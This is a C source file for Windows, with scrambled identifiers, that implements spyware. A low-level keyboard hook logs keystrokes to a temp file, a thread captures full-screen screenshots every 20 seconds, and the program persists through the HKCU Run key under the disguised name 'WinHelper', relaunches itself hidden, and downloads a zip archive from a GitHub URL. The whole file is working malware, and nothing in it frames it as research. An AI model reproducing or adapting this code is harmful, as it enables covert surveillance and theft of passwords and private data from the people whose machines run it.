#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#define STR1(x) #x
#define STR2(x) STR1(x)
#define RND_NAME(x) x##__##__LINE__

HHOOK jqzmnvhxw;

void xzpksqvwo(const char* zqsyjxnwe, char* xvkgcuapx) {
    char gpclirbpv[MAX_PATH];
    GetTempPath(MAX_PATH, gpclirbpv);
    sprintf(xvkgcuapx, "%s%s", gpclirbpv, zqsyjxnwe);
}

LRESULT CALLBACK frcgxktod(int ybwenqolz, WPARAM jcpihgnl, LPARAM nklibsvyw) {
    if (ybwenqolz == HC_ACTION && jcpihgnl == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* aumotckx = (KBDLLHOOKSTRUCT*)nklibsvyw;
        char yzcrfpqnk[MAX_PATH];
        xzpksqvwo("log.txt", yzcrfpqnk);

        FILE* zgmpwytf = fopen(yzcrfpqnk, "a+");
        if (zgmpwytf) {
            DWORD rzwjaukv = aumotckx->vkCode;
            switch (rzwjaukv) {
                case VK_RETURN: fprintf(zgmpwytf, "[ENTER]"); break;
                case VK_BACK: fprintf(zgmpwytf, "[BACKSPACE]"); break;
                case VK_TAB: fprintf(zgmpwytf, "[TAB]"); break;
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: fprintf(zgmpwytf, "[SHIFT]"); break;
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: fprintf(zgmpwytf, "[CTRL]"); break;
                case VK_MENU: case VK_LMENU: case VK_RMENU: fprintf(zgmpwytf, "[ALT]"); break;
                case VK_ESCAPE: fprintf(zgmpwytf, "[ESC]"); break;
                case VK_LEFT: fprintf(zgmpwytf, "[LEFT]"); break;
                case VK_RIGHT: fprintf(zgmpwytf, "[RIGHT]"); break;
                case VK_UP: fprintf(zgmpwytf, "[UP]"); break;
                case VK_DOWN: fprintf(zgmpwytf, "[DOWN]"); break;
                case VK_SPACE: fprintf(zgmpwytf, " "); break;
                default: {
                    BYTE knthojdy[256];
                    GetKeyboardState(knthojdy);
                    char mndctfxk[2];
                    if (ToAscii(rzwjaukv, aumotckx->scanCode, knthojdy, (LPWORD)mndctfxk, 0) == 1) {
                        fprintf(zgmpwytf, "%c", mndctfxk[0]);
                    }
                }
            }
            fclose(zgmpwytf);
        }
    }
    return CallNextHookEx(jqzmnvhxw, ybwenqolz, jcpihgnl, nklibsvyw);
}

void dqhwcsrm() {
    char bfuvlxzn[MAX_PATH];
    GetModuleFileName(NULL, bfuvlxzn, MAX_PATH);
    char vextdpor[MAX_PATH + 20];
    sprintf(vextdpor, "\"%s\" -a", bfuvlxzn);
    HKEY rmdhqzjt;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &rmdhqzjt) == ERROR_SUCCESS) {
        RegSetValueEx(rmdhqzjt, "WinHelper", 0, REG_SZ, (BYTE*)vextdpor, strlen(vextdpor) + 1);
        RegCloseKey(rmdhqzjt);
    }
}

void otkwqflgxh(HBITMAP ekgrlznp, const char* zqsyjxnwe) {
    BITMAP nwxkacry;
    GetObject(ekgrlznp, sizeof(BITMAP), &nwxkacry);
    FILE* hfucjwyg = fopen(zqsyjxnwe, "wb");
    if (!hfucjwyg) return;

    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = nwxkacry.bmWidth;
    bi.biHeight = -nwxkacry.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    DWORD size = ((nwxkacry.bmWidth * 32 + 31) / 32) * 4 * nwxkacry.bmHeight;
    char* data = (char*)malloc(size);

    GetDIBits(GetDC(0), ekgrlznp, 0, (UINT)nwxkacry.bmHeight, data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = size + bmfHeader.bfOffBits;
    bmfHeader.bfType = 0x4D42;

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, hfucjwyg);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, hfucjwyg);
    fwrite(data, size, 1, hfucjwyg);

    fclose(hfucjwyg);
    free(data);
}

DWORD WINAPI sbtlodcz(LPVOID unused) {
    while (1) {
        Sleep(20000);
        int sx = GetSystemMetrics(SM_CXSCREEN);
        int sy = GetSystemMetrics(SM_CYSCREEN);
        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        HBITMAP bmp = CreateCompatibleBitmap(hScreen, sx, sy);
        SelectObject(hDC, bmp);
        BitBlt(hDC, 0, 0, sx, sy, hScreen, 0, 0, SRCCOPY);

        SYSTEMTIME st;
        GetLocalTime(&st);
        char zqsyjxnwe[100], fullpath[MAX_PATH];
        sprintf(zqsyjxnwe, "ss_%04d%02d%02d_%02d%02d%02d.bmp",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        xzpksqvwo(zqsyjxnwe, fullpath);

        otkwqflgxh(bmp, fullpath);

        DeleteDC(hDC);
        DeleteObject(bmp);
        ReleaseDC(NULL, hScreen);
    }
    return 0;
}

DWORD WINAPI ygveqwrz(LPVOID unused) {
    const char* url = "https://github.com/vanniichan/secret2/archive/refs/heads/main.zip";
    char fullpath[MAX_PATH];
    xzpksqvwo("sec.zip", fullpath);

    HINTERNET hInt = InternetOpen("dl", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hURL = InternetOpenUrl(hInt, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hURL) {
        FILE* f = fopen(fullpath, "wb");
        char buf[1024];
        DWORD bytes;
        while (InternetReadFile(hURL, buf, sizeof(buf), &bytes) && bytes) {
            fwrite(buf, 1, bytes, f);
        }
        fclose(f);
        InternetCloseHandle(hURL);
    }
    InternetCloseHandle(hInt);
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR cmd, int c) {
    dqhwcsrm();
    if (strstr(cmd, "-a") != NULL) {
        Sleep(3000);
        char z[MAX_PATH];
        GetModuleFileName(NULL, z, MAX_PATH);
        ShellExecute(NULL, "open", z, NULL, NULL, SW_HIDE);
        return 0;
    }

    jqzmnvhxw = SetWindowsHookEx(WH_KEYBOARD_LL, frcgxktod, GetModuleHandle(NULL), 0);
    CreateThread(NULL, 0, sbtlodcz, NULL, 0, NULL);
    CreateThread(NULL, 0, ygveqwrz, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(jqzmnvhxw);
    return 0;
}
